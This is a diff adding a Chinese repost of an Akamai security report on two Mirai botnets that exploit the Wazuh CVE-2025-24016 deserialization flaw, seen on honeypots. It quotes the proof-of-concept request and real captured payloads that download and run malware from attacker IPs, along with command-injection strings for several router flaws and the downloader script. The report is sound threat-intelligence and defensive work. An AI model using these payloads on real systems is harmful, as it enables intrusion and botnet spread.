@@ -86,6 +86,367 @@
 
     
         <h2 class="title">
+            <a href="/2025/12/19/CVE-2025-24016-Wazuh/">
+                两大僵尸网络，一个漏洞：Mirai 利用 Wazuh 漏洞传播
+            </a>
+        </h2>
+    
+    <time>
+        Dec 19, 2025
+    </time>
+    <section class="content">
+        <h1><span id="两大僵尸网络一个漏洞mirai-利用-wazuh-漏洞传播">两大僵尸网络，一个漏洞：Mirai 利用 Wazuh 漏洞传播</span></h1><blockquote>
+<p>本文转自 <a target="_blank" rel="noopener" href="https://www.akamai.com/zh/blog/security-research/botnets-flaw-mirai-spreads-through-wazuh-vulnerability">Kyle Lefton 和 Daniel Messing</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p><em>本报告中的所有发现均来源于 SIRT 部署的蜜罐系统，我们并未在实际运行 Wazuh 软件的 Wazuh 生产端点中观察到相同事件。</em></p>
+<p><em>内容警告：本文使用的一些命名约定来源于攻击者，包含种族辱骂用语和粗俗表达。出于教学和探索目的，我们并未删除或隐藏这类命名。这类用语绝不代表 Akamai 的价值观或观点。</em></p>
+</blockquote>
+<h2><span id="内容提要">内容提要</span></h2><blockquote>
+<ul>
+<li>Akamai 安全情报响应团队 (SIRT) 发现了针对关键远程代码执行 (RCE) 漏洞 CVE-2025-24016 (CVSS 9.9) 的主动利用行为，该漏洞以 Wazuh 服务器为攻击目标。</li>
+<li>该漏洞利用去中心化 API (DAPI) 请求，允许攻击者上传未净化的字典来远程执行代码。</li>
+<li>我们观察到了 Mirai 变种利用该漏洞的两次攻击活动。其中一个变种名叫“Resbot”，它在域中采用了意大利命名法，可能暗示了目标设备的所有者是哪类人，比如是居住在意大利的人，或者是使用意大利语的人。</li>
+<li>2025 年 3 月，Akamai SIRT 团队首次在我们的全球蜜罐网络中发现此类攻击活动。<strong>这是自 2025 年 2 月该漏洞首次曝光以来，攻击者主动利用该漏洞的首次报告案例</strong>。</li>
+<li>利用该漏洞的僵尸网络同时还利用了数个已知漏洞，包括 CVE-2023-1389、CVE-2017-17215、CVE-2017-18368 和其它漏洞。</li>
+<li>为帮助抵御此威胁，我们在本博文末尾提供了相关的入侵指标 (IOC) 列表。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.akamai.com/zh/blog/security-research/botnets-flaw-mirai-spreads-through-wazuh-vulnerability#iocs">跳转到 IOC</a></p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>2025 年 3 月下旬，Akamai SIRT 团队在我们的网络蜜罐集群中观察到了主动利用 CVE-2025-24016 漏洞的攻击企图。SIRT 团队发现，共有两个不同的僵尸网络利用该漏洞，将 Mirai 恶意软件的变种传播到存在漏洞的目标系统中。</p>
+</blockquote>
+<h2><span id="什么是-cve-2025-24016">什么是 CVE-2025-24016？</span></h2><blockquote>
+<p>2025 年 2 月，在集成 XDR 和 SIEM 功能的开源解决方案 <a target="_blank" rel="noopener" href="https://wazuh.com/platform/overview/">Wazuh</a> 的管理器程序包中，首次曝光了 <a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2025-24016">CVE-2025-24016</a> 漏洞。该漏洞会影响 Wazuh 4.4.0 到 4.9.0 的所有版本，目前 4.9.1 版本已发布，包含该漏洞的修复补丁。该漏洞允许具有 API 权限的远程攻击者使用恶意构造的 JSON 文件，在目标服务器上执行任意代码。</p>
+<p>在 Wazuh API 中，系统首先将 <em>DistributedAPI</em> 中的参数序列化为 JSON 格式，然后再使用 <em>framework&#x2F;wazuh&#x2F;core&#x2F;cluster&#x2F;common.py</em> 文件中的 <em>as_Wazuh_object</em> 将这些参数反序列化。攻击者可以向 DAPI 请求中注入未净化的字典来利用该漏洞，以此解析和执行任意的 Python 代码。</p>
+<p>2025 年 2 月下旬，一份<a target="_blank" rel="noopener" href="https://github.com/MuhammadWaseem29/CVE-2025-24016">概念验证 (PoC) 文档</a>详细说明了如何利用该漏洞实现远程代码执行 (RCE)。攻击者先控制 <em>auth_context</em> 的参数，再使用 <em>run_as</em> 接口端点触发远程代码执行 (RCE)。在这份 PoC 文档中，作者针对 URI <em>&#x2F;security&#x2F;user&#x2F;authenticate&#x2F;run_as</em>，使用 Burp Suite 请求演示了攻击过程（见图 1）。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/security/user/authenticate/run_as</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com:55000</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic d2F6dXcta3dpTUltUzNjcjM3UDA1MHItOg==  # Base64-encoded &quot;wazuh-wui:MyS3cr37P450r.*-&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>83</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">&#123;</span></span><br><span class="line"><span class="language-prolog">  <span class="string">&quot;__unhandled_exc__&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;__class__&quot;</span>: <span class="string">&quot;exit&quot;</span>,</span></span><br><span class="line"><span class="language-prolog">    <span class="string">&quot;__args__&quot;</span>: []</span></span><br><span class="line"><span class="language-prolog">  &#125;</span></span><br><span class="line"><span class="language-prolog">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>图 1：Burp Suite 请求（资料来源：<a target="_blank" rel="noopener" href="https://github.com/MuhammadWaseem29/CVE-2025-24016%EF%BC%89">https://github.com/MuhammadWaseem29/CVE-2025-24016）</a></p>
+<p>Authorization 标头字段采用 Base64 编码格式，恶意有效负载包含了未净化的异常 *<strong>unhandled_exc</strong>*，最终触发了任意 Python 代码的执行——在本场景中，触发了 <em>exit</em> 操作。</p>
+</blockquote>
+<h2><span id="主动利用">主动利用</span></h2><blockquote>
+<p>时间来到 2025 年 3 月上旬，距离 Wazuh 漏洞曝光仅仅过去几周时间，Akamai SIRT 便发现，我们的全球蜜罐网络中有攻击者正试图利用该漏洞。僵尸网络运营者利用最新发布的常见漏洞和风险 (CVE) 发动攻击，速度越来越快，使得漏洞利用时间窗口期越来越短，这便是最新的例证。</p>
+<p>Base64 编码格式的 Authorization 标头字段解码后的认证信息显示为 *wazuh-wui:MyS3cr37P450r.*-*，与 PoC 文档中的漏洞利用认证信息<strong>完全相同</strong>（图 2）。此处的接口端点和请求结构与 PoC 文档的漏洞利用信息相吻合，当然，本案例中的攻击者仅使用该漏洞传播恶意软件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/security/user/authenticate/run_as &#123;<span class="string">&quot;__unhandled_exc__&quot;</span>:&#123;<span class="string">&quot;__args__&quot;</span>:[<span class="string">&quot;wget http://176.65.134[.]62/w.sh -O /tmp/temp_script.sh || curl -o /tmp/temp_script.sh http://176.65.134[.]62/w.sh; sh /tmp/temp_script.sh&quot;</span>],<span class="string">&quot;__class__&quot;</span>:<span class="string">&quot;os.system&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">Header Authorization: Basic d2F6dWgtd3VpOk15UzNjcjM3UDQ1MHIuKi0=</span><br></pre></td></tr></table></figure>
+
+<p>图 2：漏洞利用企图 1 和 PoC 文档的信息完全相同</p>
+<p>另外，2025 年 5 月上旬，我们还检测到了针对 <em>&#x2F;Wazuh</em> 接口端点的请求，该请求的结构虽然与文档记录的信息相似，但在该漏洞针对的标准接口端点处仍有差异。（图 3）。由于该请求与 PoC 文档记录的请求几乎完全相同，只在接口端点处不同，因此这很可能是上述僵尸网络仍然在尝试利用相同的 Wazuh 漏洞发起攻击。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/wazuh &#123;<span class="string">&quot;__unhandled_exc__&quot;</span>: &#123;<span class="string">&quot;__class__&quot;</span>: <span class="string">&quot;os.system&quot;</span>, <span class="string">&quot;__args__&quot;</span>: [<span class="string">&quot;wget http://104.168.101[.]27/sh -O- | sh&quot;</span>]&#125;&#125;</span><br><span class="line"></span><br><span class="line">Header Authorization: Basic d2F6dWgtd3VpOk15UzNjcjM3UDQ1MHIuKi0=</span><br></pre></td></tr></table></figure>
+
+<p>图 3：漏洞利用企图 2 和 PoC 文档的信息仍有差异</p>
+</blockquote>
+<h2><span id="僵尸网络-1多种-mirai-变体">僵尸网络 1：多种 Mirai 变体</span></h2><blockquote>
+<p>根据我们的观察，本次主动利用 Wazuh 漏洞事件与两大僵尸网络有关。第一个僵尸网络与 2025 年 3 月上旬的第一轮攻击企图相关，在这轮攻击中，攻击者利用漏洞获取并执行一个恶意 Shell 脚本作为下载器，再将下载器作为主要的 Mirai 恶意软件有效负载（图 4）。与常见的 Mirai 相关 Shell 脚本类似，该脚本兼容各类不同的架构，主要以物联网 (IoT) 设备为攻击目标。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;busybox wget http://176.65.134[.]62/bins/morte.arm; chmod 777 morte.arm; ./morte.arm morte.arm&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.arm5; chmod 777 morte.arm5; ./morte.arm5 morte.arm5&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.arm6; chmod 777 morte.arm6; ./morte.arm6 morte.arm6&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.arm7; chmod 777 morte.arm7; ./morte.arm7 morte.arm7&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.i686; chmod 777 morte.i686; ./morte.i686 morte.i686&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.m68k; chmod 777 morte.m68k; ./morte.m68k morte.m68k&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.mips; chmod 777 morte.mips; ./morte.mips morte.mips&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.mpsl; chmod 777 morte.mpsl; ./morte.mpsl morte.mpsl&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.ppc; chmod 777 morte.ppc; ./morte.ppc morte.ppc&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.sh4; chmod 777 morte.sh4; ./morte.sh4 morte.sh4&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.spc; chmod 777 morte.spc; ./morte.spc morte.spc&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.x86; chmod 777 morte.x86; ./morte.x86 morte.x86&quot;,</span><br><span class="line">   &quot;busybox wget http://176.65.134[.]62/bins/morte.x64; chmod 777 morte.x64; ./morte.x64 morte.x64&quot;,</span><br><span class="line">   &quot;rm $0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>代码示例 4：<em>w.sh</em> Shell 脚本内容</p>
+<p>这些 Mirai 恶意软件样本被命名为“morte”，似乎是 LZRD Mirai 变体，但它们并不是新面孔，而是已经存在一段时间了。这些恶意软件很容易识别，因为它们在目标设备上执行时，会在设备的控制台输出如下的硬编码特殊字符串：“lzrd here”。</p>
+</blockquote>
+<h3><span id="观察到的相关域名">观察到的相关域名</span></h3><blockquote>
+<p>经过对 IP 地址 176.65.134[.]62 调查研究，我们发现该地址反向解析到了 <em>nuklearcnc.duckdns[.]org</em> 的命令和控制 (C2) 域名。请注意，我们有必要指出，Duck DNS 是一家动态 DNS 服务商，只有此处的子域名是恶意域名。</p>
+<p>在相近的时间段内，该域名还解析到了 176.65.142.252 这个 IP 地址。该 IP 地址反向解析到了另一个 <em>cbot.galaxias[.]cc</em> 的 C2 域名。根据 VirusTotal 的分析，我们可以发现一个疑似针对 Windows 系统的远程访问木马 (RAT)，该木马伪装成 Windows <em>svchost</em> 进程，定期向 <em>cbot.galaxias[.]cc</em> 子域名发送“心跳信号”，以达到命令与控制 (C2) 目的。</p>
+<p>另一个子域名 <em>neon.galaxias[.]cc</em> 似乎存在 Mirai 常规变种的相关分发和通信行为。该子域名解析出来的 IP 地址 209.141.34[.]106，也反向解析到了另外两个 C2 域名：<em>pangacnc[.]com</em> 和 <em>jimmyudp-raw[.]xyz</em>。</p>
+<p>根据 VirusTotal 的记录，<em>jimmyudp-raw[.]xyz</em> 域名共有三个不同名称的 Mirai 恶意软件样本。第一个样本名为“<em>neon</em>”，是一种未识别的 Mirai 变种，通过端口 80 连接到 65.222.202[.]53，实现 C2 通信，而且会在控制台输出硬编码字符串“fuck u nigga”。</p>
+<p>第二个样本名为“<em>k03ldc</em>”，似乎是 V3G4 Mirai 变体的修改版或升级版。该样本会在控制台输出硬编码字符串“<em>666V3G4-Katana999</em>”，通过端口 36063 连接到 196.251.86[.]49，实现 C2 通信。</p>
+<p>最后是名为“<em>KKveTTgaAAsecNNaaaa</em>”的第三个样本，它是 V3G4 Mirai 变体的原始版本。该版本的恶意软件通过端口 60195 连接到 209.141.34[.]106，实现 C2 通信，感染设备后会输出硬编码字符串“<em>xXxSlicexXxxVEGA</em>”。它会识别目标设备是否已经感染 V3G4 变体，如果确认感染，会输出“We got this shit already”，而不会输出上述的常规硬编码字符串。</p>
+<p>根据 VirusTotal 的记录，<em>pangacnc[.]com</em> 域名共有两个不同名称的 Mirai 恶意软件样本，一个名为“<em>KKveTTgaAAsecNNaaaa</em>”，与上文提到的第三个样本完全相同。另一个名为“<em>vision</em>”，是一种 LZRD Mirai 变体，通过端口 80 连接到 65.222.202[.]53，类似于从其它 C2 域名获得的样本“<em>neon</em>”。这种相似，可能掲示出这个名为“<em>neon</em>”的 Mirai 恶意软件是 LZRD 变体的修改版。</p>
+</blockquote>
+<h3><span id="其他被利用的漏洞">其他被利用的漏洞</span></h3><blockquote>
+<p>除了针对 Wazuh 的远程代码执行 (RCE)，我们还观察到该僵尸网络正试图利用各类其它已知漏洞发起攻击。被利用的漏洞包括我们已经观察到的数个漏洞（见图 5、6、7），这些漏洞已经在往期博文中详细说明。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ws/v1/cluster/apps &#123;<span class="string">&quot;application-id&quot;</span>: <span class="string">&quot;application_1404198295326_0003&quot;</span>, <span class="string">&quot;application-name&quot;</span>: <span class="string">&quot;get-shell&quot;</span>, <span class="string">&quot;am-container-spec&quot;</span>: &#123;<span class="string">&quot;commands&quot;</span>: &#123;<span class="string">&quot;command&quot;</span>: <span class="string">&quot;wget http://176.65.134[.]62/bins/morte.x64; chmod 777 morte.x64; ./morte.x64 morte.x86_64; rm -rf morte.x64; curl -O http://176.65.134[.]62/bins/morte.x64; chmod 777 morte.x64; ./morte.x64 morte.x86_64; rm -rf morte.x64&quot;</span>&#125;&#125;, <span class="string">&quot;application-</span></span><br></pre></td></tr></table></figure>
+
+<p>图 5：Hadoop YARN 漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/luci/;stok=/locale?form=country operation=write&amp;country=$(<span class="built_in">id</span>&gt;<span class="built_in">cd</span> /tmp <span class="built_in">cd</span> /var/run <span class="built_in">cd</span> /mnt <span class="built_in">cd</span> /root <span class="built_in">cd</span> /; wget http://176.65.134[.]62/update.sh; curl -O http://176.65.134[.]62/update.sh; <span class="built_in">chmod</span> 777 update.sh; sh update.sh; tftp 176.65.134[.]62 -c get tupdate.sh; <span class="built_in">chmod</span> 777 tupdate.sh; sh tupdate.sh; tftp -r tupdate2.sh -g 176.65.134[.]62; <span class="built_in">chmod</span> 777 tupdate2.sh; sh tupdate2.sh; ftpget -v -u anonymous -p anonymous -P 21 176.65.134[.]62 update1.sh update1.sh; sh update1.sh; <span class="built_in">rm</span> -rf update.sh tupdate</span><br></pre></td></tr></table></figure>
+
+<p>图 6：TP-Link Archer AX21 命令注入（详见 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2023-1389%EF%BC%89">https://nvd.nist.gov/vuln/detail/cve-2023-1389）</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/manager_dev_ping_t.gch <span class="built_in">cd</span> /tmp || <span class="built_in">cd</span> /var/run || <span class="built_in">cd</span> /mnt || <span class="built_in">cd</span> /root || <span class="built_in">cd</span> /; wget http://209.141.34[.]106/1.sh; curl -O http://209.141.34[.]106/1.sh; <span class="built_in">chmod</span> 777 1.sh; sh 1.sh; tftp 209.141.34[.]106 -c get 1.sh; <span class="built_in">chmod</span> 777 1.sh; sh 1.sh; tftp -r 3.sh -g 209.141.34[.]106; <span class="built_in">chmod</span> 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.34[.]106 2.sh 2.sh; sh 2.sh; <span class="built_in">rm</span> -rf 1.sh 1.sh 3</span><br></pre></td></tr></table></figure>
+
+<p>图 7：中兴 ZXV10 H108L 路由器 RCE 漏洞利用（详见 <a target="_blank" rel="noopener" href="https://github.com/stasinopoulos/ZTExploit/blob/master/ZTExploit_Source/ztexploit.py%EF%BC%89">https://github.com/stasinopoulos/ZTExploit/blob/master/ZTExploit_Source/ztexploit.py）</a></p>
+</blockquote>
+<h2><span id="僵尸网络-2resbotx2fresentual-僵尸网络">僵尸网络 2：Resbot&#x2F;Resentual 僵尸网络</span></h2><blockquote>
+<p>我们发现的第二个僵尸网络来源于 2025 年 5 月上旬，攻击者尝试利用 <em>&#x2F;Wazuh</em> 接口端点发起的攻击。与上述第一个僵尸网络相似，攻击者同样会获取并执行一个恶意的 Shell 脚本作为 Mirai 下载器。该恶意软件命名为“resgod”，可通过其硬编码控制台字符串“Resentual got you!”进行识别。该僵尸网络与上述第一个僵尸网络还有一点相似，它的有效负载兼容各类架构，而且以物联网 (IoT) 设备为攻击目标。</p>
+<p>我们注意到，该僵尸网络与特定语言联系紧密，这个现象很有意思。它传播恶意软件的各类域名都采用了意大利命名法。例如，类似“<em>gestisciweb.com</em>”的域名可以粗略翻译为“管理网页&#x2F;网站”。</p>
+<p>这些域名与经常用于网络钓鱼攻击的恶意域名非常相似，看上去比它们的 C2 域名“<em>resbot.online</em>”更加合法，相比起来，它们的 C2 域名明显更像恶意域名。这种命名约定表明，这类攻击活动的特定目标是意大利语使用者持有或运营的设备。</p>
+<p>恶意软件样本中的字符串未加密，暴露出该软件具有各类额外的扫描能力和漏洞利用能力。恶意软件中的 IP 地址 104.168.101[.]27 采用硬编码格式，通过 TCP 端口 62627 与 C2 服务器通信，该端口是潜在的 C2 端口之一。另外，我们还发现该僵尸网络正试图通过 FTP 服务器的端口 21 传播恶意软件并执行 Telnet 扫描。</p>
+<p>这些硬编码漏洞利用之间的区别，请详见图 8、9、10、11。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ctrlt/DeviceUpgrade_1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>440</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-reasonml">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;&lt;s:Envelope xmlns:s=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> s:encodingStyle=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span>&gt;		&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=<span class="string">&quot;urn:schemas-upnp- org:service:WANPPPConnection:1&quot;</span>&gt;&lt;NewStatusURL&gt;<span class="constructor">$(<span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">busybox</span> <span class="params">wget</span> -<span class="params">g</span> 104.168.101[.]27 -<span class="params">l</span> <span class="operator">/</span><span class="params">tmp</span><span class="operator">/</span>.<span class="params">kx</span> -<span class="params">r</span> <span class="operator">/</span><span class="params">resgod</span>.<span class="params">mips</span>; <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">busybox</span> <span class="params">chmod</span> +<span class="params">x</span> <span class="operator">/</span><span class="params">tmp</span><span class="operator">/</span>.<span class="params">kx</span>; <span class="operator">/</span><span class="params">tmp</span><span class="operator">/</span>.<span class="params">kx</span> <span class="params">selfrep</span>.<span class="params">huawei</span>)</span>&lt;/NewStatusURL&gt;. &lt;NewDownloadURL&gt;<span class="constructor">$(<span class="params">echo</span> HUAWEIUPNP)</span>&lt;/NewDownloadURL&gt;	&lt;/u:Upgrade&gt;. &lt;/s:Body&gt;&lt;/s:Envelope&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>图 8：华为 HG532 路由器 RCE（详见 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2017-17215%EF%BC%89">https://nvd.nist.gov/vuln/detail/cve-2017-17215）</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/picsdesc.xml</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>630</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Hello-World</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">s:Envelope</span> <span class="attr">xmlns:s</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope//&quot;</span> <span class="attr">s:encodingStyle</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/encoding//%22%3E&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=&quot;</span><span class="attr">urn:schemas-upnp-org:service:WANIPConnection:1</span>&quot;&gt;</span><span class="tag">&lt;<span class="name">NewRemoteHost</span>&gt;</span><span class="tag">&lt;/<span class="name">NewRemoteHost</span>&gt;</span><span class="tag">&lt;<span class="name">NewExternalPort</span>&gt;</span>47450<span class="tag">&lt;/<span class="name">NewExternalPort</span>&gt;</span><span class="tag">&lt;<span class="name">NewProtocol</span>&gt;</span>TCP<span class="tag">&lt;/<span class="name">NewProtocol</span>&gt;</span><span class="tag">&lt;<span class="name">NewInternalPort</span>&gt;</span>44382<span class="tag">&lt;/<span class="name">NewInternalPort</span>&gt;</span><span class="tag">&lt;<span class="name">NewInternalClient</span>&gt;</span>cd /var/; wget http://104.168.101[.]27/resgod.mips; chmod 777 resgod.mips; ./resgod.mips selfrep.realtek<span class="tag">&lt;/<span class="name">NewInternalClient</span>&gt;</span><span class="tag">&lt;<span class="name">NewEnabled</span>&gt;</span>1<span class="tag">&lt;/<span class="name">NewEnabled</span>&gt;</span><span class="tag">&lt;<span class="name">NewPortMappingDescription</span>&gt;</span>syncthing<span class="tag">&lt;/<span class="name">NewPortMappingDescription</span>&gt;</span><span class="tag">&lt;<span class="name">NewLeaseDuration</span>&gt;</span>0<span class="tag">&lt;/<span class="name">NewLeaseDuration</span>&gt;</span><span class="tag">&lt;/<span class="name">u:AddPortMapping</span>&gt;</span><span class="tag">&lt;/<span class="name">s:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">s:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>图 9：Realtek SDK Miniigd UPnP SOAP RCE（详见 <a target="_blank" rel="noopener" href="https://www.google.com/url?q=https://nvd.nist.gov/vuln/detail/cve-2014-8361&amp;sa=D&amp;source=docs&amp;ust=1748461205172738&amp;usg=AOvVaw2FtzN61mQxXkxEWnb9gb05%EF%BC%89">https://www.google.com/url?q=https://nvd.nist.gov/vuln/detail/cve-2014-8361&amp;sa=D&amp;source=docs&amp;ust=1748461205172738&amp;usg=AOvVaw2FtzN61mQxXkxEWnb9gb05）</a></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/ViewLog.asp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>r00ts3c-owned-you</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>176</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">remote_submit_Flag</span>=<span class="number">1</span>&amp;remote_syslog_Flag=<span class="number">1</span>&amp;RemoteSyslogSupported=<span class="number">1</span>&amp;LogFlag=<span class="number">0</span>&amp;remote_host=%<span class="number">3</span>bcd+/tmp;wget+http://<span class="number">104</span>.<span class="number">168</span>.<span class="number">101</span>[.]<span class="number">27</span>/resgod.arm7;chmod+<span class="number">777</span>+resgodarm7;./resgodarm7;rm+-rf+resgod.arm7%<span class="number">3</span>b%<span class="number">23</span>&amp;remoteSubmit=Save</span></span><br></pre></td></tr></table></figure>
+
+<p>图 10：TrueOnline ZyXEL P660HN-T v1 路由器命令注入（详见 <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2017-18368%EF%BC%89">https://nvd.nist.gov/vuln/detail/cve-2017-18368）</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;next_url=ftp.htm&amp;port=21&amp;user=ftp&amp;<span class="built_in">pwd</span>=ftp&amp;<span class="built_in">dir</span>=/&amp;mode=PORT&amp;upload_interval=0&amp;svr=$(<span class="built_in">echo</span> -e <span class="string">&quot;wget http://104.168.101[.]27/sh&quot;</span> &gt;&gt; /tmp/.res) HTTP/1.0</span><br></pre></td></tr></table></figure>
+
+<p>图 11：通过 FTP 传播</p>
+</blockquote>
+<h2><span id="结论">结论</span></h2><blockquote>
+<p>目前 Mirai 的传播态势仍呈相对上升趋势，因为它的传播方式依然十分直接：重新调整并复用旧源代码，以此部署或新建僵尸网络。僵尸网络运营者往往只需要利用新曝光的漏洞，便能轻松完成攻击。</p>
